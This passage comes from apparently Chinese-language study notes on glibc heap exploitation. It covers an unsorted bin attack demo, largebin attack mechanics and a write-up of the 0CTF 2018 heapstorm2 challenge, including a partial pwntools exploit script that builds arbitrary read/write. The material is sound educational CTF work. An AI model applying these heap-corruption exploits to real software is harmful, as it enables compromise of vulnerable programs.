class="hljs-string">&quot;unsorted bin with its bk pointer &quot;</span><br>                  <span class="hljs-string">&quot;point to %p\n&quot;</span>,<br>          (<span class="hljs-keyword">void</span> *)p[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-comment">/*------------VULNERABILITY-----------*/</span><br>  p[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(&amp;target_var - <span class="hljs-number">2</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the &quot;</span><br>                  <span class="hljs-string">&quot;victim-&gt;bk pointer\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And we write it with the target address-16 (in 32-bits &quot;</span><br>                  <span class="hljs-string">&quot;machine, it should be target address-8):%p\n\n&quot;</span>,<br>          (<span class="hljs-keyword">void</span> *)p[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-comment">//------------------------------------</span><br><br>  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s malloc again to get the chunk we just free. During &quot;</span><br>                  <span class="hljs-string">&quot;this time, target should has already been &quot;</span><br>                  <span class="hljs-string">&quot;rewrite:\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %p\n&quot;</span>, &amp;target_var, (<span class="hljs-keyword">void</span> *)target_var);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>程序执行后的效果为</p><figure class="highlight markdown"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs markdown">➜  unsorted<span class="hljs-emphasis">_bin_</span>attack git:(master) ✗ gcc unsorted<span class="hljs-emphasis">_bin_</span>attack.c -o unsorted<span class="hljs-emphasis">_bin_</span>attack<br>➜  unsorted<span class="hljs-emphasis">_bin_</span>attack git:(master) ✗ ./unsorted<span class="hljs-emphasis">_bin_</span>attack<br>This file demonstrates unsorted bin attack by write a large unsigned long value into stack<br>In practice, unsorted bin attack is generally prepared for further attacks, such as <span class="hljs-emphasis">*rewriting the global variable global_max_fast*</span> in libc for further fastbin attack<br><br>Let&#x27;s first look at the target we want to rewrite on stack:<br>0x7ffe0d232518: 0<br><br>Now, we allocate first normal chunk on the heap at: 0x1fce010<br>And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()<br><br>We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78<br>Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer<br>And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508<br><br>Let&#x27;s malloc again to get the chunk we just free. During this time, target should has already been rewrite:<br>0x7ffe0d232518: 0x7f1c705ffb78<br></code></pre></div></td></tr></table></figure><p>这里我们可以使用一个图来描述一下具体发生的流程以及背后的原理。</p><p><img src="../../image/glibc_malloc_srcCode/unsorted_bin_attack_order.png" alt="img"></p><p><strong>初始状态时</strong> </p><p>unsorted bin 的 fd 和 bk 均指向 unsorted bin 本身。</p><p><strong>执行 free(p)</strong> </p><p>由于释放的 chunk 大小不属于 fast bin 范围内，所以会首先放入到 unsorted bin 中。</p><p><strong>修改 p[1]</strong> </p><p>经过修改之后，原来在 unsorted bin 中的 p 的 bk 指针就会指向 target addr-16 处伪造的 chunk，即 Target Value 处于伪造 chunk 的 fd 处。</p><p><strong>申请 400 大小的 chunk</strong> </p><p>此时，所申请的 chunk 处于 small bin 所在的范围，其对应的 bin 中暂时没有 chunk，所以会去 unsorted bin 中找，发现 unsorted bin 不空，于是把 unsorted bin 中的最后一个 chunk 拿出来。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) &#123;<br>    bck = victim-&gt;bk;<br>    <span class="hljs-keyword">if</span> (__builtin_expect(chunksize_nomask(victim) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>) ||<br>        __builtin_expect(chunksize_nomask(victim) &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>        malloc_printerr(check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<br>                        chunk2mem(victim), av);<br>    size = chunksize(victim);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">       If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">       only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">       runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">       exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">       no exact fit for a small chunk.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">/* 显然，bck被修改，并不符合这里的要求*/</span><br>    <span class="hljs-keyword">if</span> (in_smallbin_range(nb) &amp;&amp; bck == unsorted_chunks(av) &amp;&amp;<br>        victim == av-&gt;last_remainder &amp;&amp;<br>        (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb + MINSIZE)) &#123;<br>        ....<br>    &#125;<br><br>    <span class="hljs-comment">/* remove from unsorted list */</span><br>    unsorted_chunks(av)-&gt;bk = bck;<br>    bck-&gt;fd                 = unsorted_chunks(av);<br></code></pre></div></td></tr></table></figure><ul><li>victim = unsorted_chunks(av)-&gt;bk=p</li><li>bck = victim-&gt;bk=p-&gt;bk = target addr-16</li><li>unsorted_chunks(av)-&gt;bk = bck=target addr-16</li><li>bck-&gt;fd = *(target addr -16+16) = unsorted_chunks(av);</li></ul><p><strong>可以看出，在将 unsorted bin 的最后一个 chunk 拿出来的过程中，victim 的 fd 并没有发挥作用，所以即使我们修改了其为一个不合法的值也没有关系。</strong>然而，需要注意的是，unsorted bin 链表可能<strong>就此破坏</strong>，在插入 chunk 时，可能会出现问题。</p><p><strong>即修改 target 处的值为 unsorted bin 的链表头部 0x7f1c705ffb78，也就是之前输出的信息。</strong> </p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">We</span> free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to <span class="hljs-number">0</span>x<span class="hljs-number">7</span>f<span class="hljs-number">1</span>c<span class="hljs-number">705</span>ffb<span class="hljs-number">78</span><br><span class="hljs-attribute">Now</span> emulating a vulnerability that can overwrite the victim-&gt;bk pointer<br><span class="hljs-attribute">And</span> we write it with the target address-<span class="hljs-number">16</span> (in <span class="hljs-number">32</span>-bits machine, it should be target address-<span class="hljs-number">8</span>):<span class="hljs-number">0</span>x<span class="hljs-number">7</span>ffe<span class="hljs-number">0</span>d<span class="hljs-number">232508</span><br><br><span class="hljs-attribute">Let</span>&#x27;s malloc again to get the chunk we just free. During this time, target should has already been rewrite:<br><span class="hljs-attribute">0x7ffe0d232518</span>: <span class="hljs-number">0</span>x<span class="hljs-number">7</span>f<span class="hljs-number">1</span>c<span class="hljs-number">705</span>ffb<span class="hljs-number">78</span><br></code></pre></div></td></tr></table></figure><p>这里我们可以看到 unsorted bin attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，唯一可以知道的是，这个值比较大。<strong>而且，需要注意的是，2.28版本已经无效</strong> </p><p>通过这个方法你可以 : </p><ul><li>通过修改循环的次数来使得程序可以执行多次循环。</li><li>修改 heap 中的 <code>global_max_fast</code> 来使得更大的 chunk 可以被视为 fast bin，这样我们就可以去执行一些 fast bin attack 了。</li></ul><h1 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h1><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/large-bin-attack/">Wiki</a> </p><blockquote><h5 id="关于指定libc调试"><a href="#关于指定libc调试" class="headerlink" title="关于指定libc调试:"></a>关于指定libc调试:</h5><ol><li>修改elf文件使用指定libc: <code>./chlibc ctest 2.27</code> </li></ol><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>if [ $# -ne 2 ]; then<br> echo Need two arguments!<br> exit 128<br>fi<br>version=$2<br>binary=$1<br>libc_path=`find /glibs -type d -regex &quot;/glibs/$version.*amd64&quot;`<br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$libc_path</span></span><br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-built_in">exit</span></span><br><br>patchelf --set-interpreter &quot;$libc_path/ld-linux-x86-64.so.2&quot; $binary<br>patchelf --set-rpath $libc_path $binary<br><br>echo ldd output:<br>ldd $binary<br></code></pre></div></td></tr></table></figure><ol start="2"><li>gdb中直接打开, 使用list查看源代码所对应文件, 一般设置为<code>dir /glibs/glibc-2.27/stdio-common/</code>即可.</li></ol><p><a href="https://sourceware.org/gdb/download/onlinedocs/gdb/Source-Path.html#Source-Path">GDB Source-path Doc</a> or <a href="https://www.jianshu.com/p/1a966b62b3d4">make glibc from src</a> </p></blockquote><ul><li>利用来源: unsorted bin循环中把chunk插入到large bin时没有检查链表完整性.<br>主要利用<code>bck-&gt;fd = victim</code> 和 <code>fwd-&gt;bk_nextsize-&gt;fd_nextsize = victim</code>, fwd是从左到右遍历出的第一个小于nb的chunk, bck是其左边一个chunk. </li><li>效果: 可以将(至少是第三个之后的)chunk的地址写到任意位置处. 可以偏移几字节使得最高位的数字填入size域. </li><li>前提: <ul><li>UAF, 或者是chunk overlapping带来的修改整个chunk的能力. </li><li>最大能malloc large bin.</li><li>对整个chunk的控制, 能写到header中的size域.</li></ul></li><li>过程:<ol><li>malloc三个chunk, 分别为small bin和两个large bin. 分配完malloc(0x20)防止合并.以chunk size = 0x3f0为分界.  </li><li>free 1和2, 放到了unsorted bin中.</li><li>然后malloc(0x90), 2移到large bin中, chunk 1被拿出分割后剩余部分放到unsorted bin. </li><li>free 3, 加入到unsorted bin, 现在3和分割后的1都在这里. </li><li>修改2(UAF), 修改size变成小于3的一个chunk. IS_MMAPED置0, bk和bk_nextsize指针指向<strong>目标地址</strong>. </li><li>malloc(0x90), 此时拿出一半的1继续分割, 3加入large bin中, 2中填入的两个地址加上偏移(因为地址被当成chunk)被覆盖成3的地址. </li><li>利用完毕.</li></ol></li><li>注意: <ul><li>添加小chunk来防止consolidation. </li><li>有<strong>两种利用方法</strong>, 加入的large的chunk大于或者小于当前最小chunk各为一种方法. 这里的过程使用的是大于.</li></ul></li><li>版本变化: <ul><li>2.30加入了对large bin跳表检查, 也就是在chunk大于large bin中最小的那一个时进行检查, 如果fwd的bck-&gt;fwd不是自身, 就报错.<br><strong>只能使用小于的那一种方法</strong>. </li></ul></li></ul><h3 id="heapstorm"><a href="#heapstorm" class="headerlink" title="heapstorm"></a>heapstorm</h3><p>菜单题. 练练手. 怎么这么奇怪….. 源文件<a href="https://github.com/willinin/0ctf2018/tree/master/heapstorm2">链接</a> </p><p>保护全开. 完全没有符号, 一个个函数的重命名. 修改alarm的时间. </p><ul><li>开头一个<code>mallopt(M_MXFAST, 0)</code>(在malloc.h)禁用了fastbin, 也就是将fastbin处理的块大小上限设置为0. </li><li>mmap 0x13370000处的一个page, 在0x13370800写入0x18(3 qword)字节的随机数. 0x13370818后赋值为第三个qword. 结尾在0x0820.<br>从0x0820开始, 连续16个0x10字节被赋值成第一个和第二个qword. </li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-number">0x13370800</span>:     a1      a2<br><span class="hljs-number">0x13370810</span>:     a3      a3<br><span class="hljs-comment">//每行tx不一定相等. </span><br></code></pre></div></td></tr></table></figure><ul><li>alloc: <ul><li>遍历上面t2, 直到某个数值和a2相等. </li><li><code>v2 &gt; 12 &amp;&amp; v2 &lt;= 4096</code> size限制. </li><li>calloc(注意这个会将内容清空)之后将, <code>t1 = a1 ^ calloc_addr</code>, <code>t2 = a2 ^ size</code>. </li></ul></li><li>update:<ul><li>idx在0-15之间, <code>a2 != t2</code>. </li><li><code> size &lt; (a2 ^ t2 - 12)</code>. <code>addr = a1 ^ t1</code> </li><li>往地址<code>addr</code>里写入size长度的数值, 最后紧跟着strcpy一个”HEAPSTORM_II”字符串. 这个字符串长为12. </li></ul></li><li>delete:<ul><li>从t1中异或解出chunk的地址. free. </li><li>恢复t1 and t2. </li></ul></li><li>view:<ul><li>两个a3要修改成a4 a5, 满足两者异或==0x13377331. </li><li>从t1和t2解出地址和长度, 输出到stdout. </li></ul></li></ul><p>最重要的问题在于update的时候读取长度为len-12, 而HEAPSTORM_II这个字符串还带有一个空字符会被strcpy复制, 造成了NULL byte off-by-one漏洞. </p><p><del>这个NULL溢出只能修改prevsize的最低字节为空. 也就是把chunk0的size变小.</del> </p><p><del>如果变小了, 而且prev_inuse位也被清空, 那么free掉chunk1的时候就会往前合并一个比实际小的chunk(当然fake chunk0的size要符合prev_size的值), fd和bk(或者加上fd_nextsize bk_nextsize)就被填入chunk0的区域内,  注意下最后12个字节不可用, 于是就可以修改或读取其内的内容, 或者在重新malloc之后修改chunk1的header.</del> </p><p>这题属实超乎我的想象, 这复杂度真是够可以的, 对着别人少了十万八千字的转载源码研究了半天终于完全看懂了, 然后看到文章结尾一个参考资料, tm复制都不弄个完整的. </p><p>原版: <a href="https://bbs.pediy.com/thread-225973.htm">link</a> </p><p>学习到的点列举一下:</p><ul><li>开头两个chunk shrink操作, 通过off-null-byte改小chunk的size域制造了一个空隙来实现chunk overlap, 通过7控制2, 8控制4. </li><li>84行时bin中有两个chunk, 4在large bin, 2在unsorted bin. 按一般large_bin_attack流程是利用第三个chunk来把unsorted放到large完成chunk的指针任意写, 将目标chunk的size改成了56(通过不断尝试aslr到56), 但是这里改写了2, 导致2的左边一个就是0x133707e0, 再左边没有设置指针, 可想而知unsorted bin大循环最终会出错. 不过利用大循环中的找到exact fit就立刻退出的特性, 只要alloc(0x48)就可以达到在指定位置malloc chunk的目的. 还要注意的是unsorted脱链的时候从右到左遍历, 会将header的bk设置为victim的bk, 所以在之前的largebin attack中除了size域还设置了bk指针为一个真实chunk, 即可避免seg fault</li><li>所以largebin attack加上unsorted bin循环利用还可以实现指定位置分配堆块. </li><li>然后就完成了任意读写的功能, 读个heap指针然后定位到某个largebin中chunk的fd_nextsize指针就可以找到libc基址, 改写__free_hook(由于RELRO). </li></ul><p>正好也确实是那句话, largebin attack只是攻击中的一环, 还要结合其他技术才能实现利用, 这一题就用了off-null-byte + chunk overlapping + largebin attack + unsortedbin大循环.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pwnlib<br> <br>context.binary = <span class="hljs-string">&#x27;./heapstorm2&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x) <br>p = <span class="hljs-literal">None</span><br>elf = ELF(<span class="hljs-string">&#x27;/glibs/2.24-3ubuntu1_amd64/libc-2.24.so&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">g</span>():</span><br>    pwnlib.gdb.attach(p)<br>    raw_input()<br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>    sl(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Size: &#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(size))<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">index,size,content</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>,timeout=<span class="hljs-number">1</span>)<br>    sl(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(index))<br>    p.recvuntil(<span class="hljs-string">&#x27;Size: &#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>,timeout=<span class="hljs-number">1</span>)<br>    sl(content)<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">index</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>    sl(<span class="hljs-string">&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(index))<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">view</span>(<span class="hljs-params">index</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>    sl(<span class="hljs-string">&quot;4&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(index))<br>    p.recvuntil(<span class="hljs-string">&#x27;Chunk[1]: &#x27;</span>)<br>    <span class="hljs-keyword">return</span> p.recv()<br> <br>base = <span class="hljs-number">0x13370800</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = process(<span class="hljs-string">&#x27;./heapstorm2&#x27;</span>)<br>    add(<span class="hljs-number">0x18</span>)    <span class="hljs-comment">#0</span><br>    add(<span class="hljs-number">0x508</span>)   <span class="hljs-comment">#1</span><br>    add(<span class="hljs-number">0x18</span>)    <span class="hljs-comment">#2</span><br>    add(<span class="hljs-number">0x18</span>)    <span class="hljs-comment">#3</span><br>    add(<span class="hljs-number">0x508</span>)   <span class="hljs-comment">#4</span><br>    add(<span class="hljs-number">0x18</span>)    <span class="hljs-comment">#5</span><br>    add(<span class="hljs-number">0x18</span>)    <span class="hljs-comment">#6  </span><br>    <br>    <span class="hljs-comment"># 这一行意义不明, 可能为了方便一点点点调试</span><br>    <span class="hljs-comment"># 主要是下一个chunk的prev_size域在malloc的过程中只有写入, 而没有读取并检查其内容. </span><br>    <span class="hljs-comment"># edit(1,(0x4f0+8),b&#x27;A&#x27;*(0x4f0)+p64(0x500))</span><br>    free(<span class="hljs-number">1</span>)<br>    edit(<span class="hljs-number">0</span>,(<span class="hljs-number">0x18</span>-<span class="hljs-number">12</span>),<span class="hljs-string">b&#x27;A&#x27;</span>*(<span class="hljs-number">0x18</span>-<span class="hljs-number">12</span>))<br>    add(<span class="hljs-number">0x18</span>)    <span class="hljs-comment">#1</span><br>    add(<span class="hljs-number">0x4d8</span>)   <span class="hljs-comment">#7   to be overlapped by 1</span><br>    free(<span class="hljs-number">1</span>)<br>    free(<span class="hljs-number">2</span>)<br>    <span class="hljs-comment">#occupy original position of chunk 1 2, now heap is full without free chunk</span><br>    <span class="hljs-comment"># we can use 7 to control 2.</span><br>    <span class="hljs-comment"># chunk 2 header is in chunk7 of (user_pointer+0x10), </span><br>    <span class="hljs-comment"># that is the reason of line91&#x27;s double qword</span><br>    add(<span class="hljs-number">0x30</span>)    <span class="hljs-comment">#1</span><br>    add(<span class="hljs-number">0x4e8</span>)   <span class="hljs-comment">#2</span><br> <br>    free(<span class="hljs-number">4</span>)<br>    edit(<span class="hljs-number">3</span>,(<span class="hljs-number">0x18</span>-<span class="hljs-number">12</span>),<span class="hljs-string">b&#x27;B&#x27;</span>*(<span class="hljs-number">0x18</span>-<span class="hljs-number">12</span>))<br>    add(<span class="hljs-number">0x18</span>)    <span class="hljs-comment">#4</span><br>    add(<span class="hljs-number">0x4d8</span>)   <span class="hljs-comment">#8   to be overlapped by 4</span><br>    free(<span class="hljs-number">4</span>)<br>    free(<span class="hljs-number">5</span>)<br>    add(<span class="hljs-number">0x40</span>)    <span class="hljs-comment">#4</span><br> <br>    <span class="hljs-comment"># move 0x4e0 from unsorted bin to large bin through free and remalloc 2.</span><br>    <span class="hljs-comment"># now we can use 8 to control freed 0x4e0</span><br>    <span class="hljs-comment"># this can be used in largebin attack.</span><br>    free(<span class="hljs-number">2</span>)<br>    add(<span class="hljs-number">0x4e8</span>)<br>    free(<span class="hljs-number">2</span>)<br> <br>    <span class="hljs-comment">#在unsorted bin中取出chunk的时候, 从右往左遍历, 最右边chunk-&gt;bk-&gt;fd=unsorted_chunks(av)</span><br>    <span class="hljs-comment">#也就是unsorted bin的head. 在这里的效果是chunk的bk的fd(也就是base-0x20+0x10)被赋值, 也没有检查合法性.</span><br>    <span class="hljs-comment">#否则就会出现segmentation fault.</span><br>    <span class="hljs-comment">#可想而知, 我们并不知道bin的头结点, 不可能一直在这条链上一直遍历下去. 但申请的是0x50的chunk,</span><br>    <span class="hljs-comment">#刚好exact fit, 马上被取出. 成功fake了一个chunk. </span><br>    payload1 = <span class="hljs-number">2</span>*p64(<span class="hljs-number">0x0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x4f1</span>)+p64(<span class="hljs-number">0</span>)+p64(base-<span class="hljs-number">0x20</span>)<br>    edit(<span class="hljs-number">7</span>,<span class="hljs-built_in">len</span>(payload1),payload1)<br> <br>    payload2 = <span class="hljs-number">4</span>*p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x4e1</span>)+p64(<span class="hljs-number">0</span>)+p64(base-<span class="hljs-number">0x20</span>+<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0</span>)+p64(base-<span class="hljs-number">0x20</span>-<span class="hljs-number">0x18</span>-<span class="hljs-number">5</span>)<br>    edit(<span class="hljs-number">8</span>,<span class="hljs-built_in">len</span>(payload2),payload2)<br> <br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment">#0x48 to chunksize is 0x50, which is same as 0x56 no_mask version</span><br>            <span class="hljs-comment"># gdb.attach(p)</span><br>            add(<span class="hljs-number">0x48</span>)     <span class="hljs-comment">#2</span><br>            p.clean()<br>            sl(<span class="hljs-string">b&#x27;what?&#x27;</span>)<br>            log.success(<span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>            <br>        <span class="hljs-keyword">except</span> EOFError:<br>            <span class="hljs-comment"># otherwise crash and try again</span><br>            <span class="hljs-comment"># why would crash happen? because the check after calloc call _int_malloc</span><br>            <span class="hljs-comment"># which is `assert( !mem || chunk_is_mmap(mem2chunk(mem)) || av == arena_for_chunk(mem2chunk(mem)) )`</span><br>            <span class="hljs-comment"># if the IS_MMAPED flag is not true, then the assertion will fail. </span><br>            <span class="hljs-comment"># so continuous testing for a most significant half byte of heap address is IS_MMAPED on. </span><br>            log.info(<span class="hljs-string">&quot;error&quot;</span>)<br>            p.close()<br>            <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">except</span> BrokenPipeError:<br>        log.info(<span class="hljs-string">&quot;error&quot;</span>)<br>        <span class="hljs-keyword">continue</span><br><span class="hljs-comment">#0x133707e0:     0x2b863cd060000000      0x0000000000000056</span><br><span class="hljs-comment">#0x133707f0:     0x00007f36a1fc1b58      0x0000562b863cd060</span><br><span class="hljs-comment">#0x13370800:     0x956bc5b57f846f56      0xfd29773a11768444</span><br><span class="hljs-comment"># clear out value used to xor decryption. and set condition to pass check in `view`</span><br><span class="hljs-comment"># @base is random read/write target address.</span><br><span class="hljs-comment"># the left xored size of chunk0 is large enough.</span><br>p1 = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>+p64(<span class="hljs-number">0x13377331</span>)+p64(base+<span class="hljs-number">0x30</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(p1),p1)<br> <br><span class="hljs-comment"># read out some heap address</span><br><span class="hljs-comment"># p2 = p64(0)*3+p64(0x13377331)+p64(base)+p64(0x100)+p64(base-0x20+3)+p64(8)</span><br>p2 = p64(base-<span class="hljs-number">0x20</span>+<span class="hljs-number">3</span>)+p64(<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">0</span>,<span 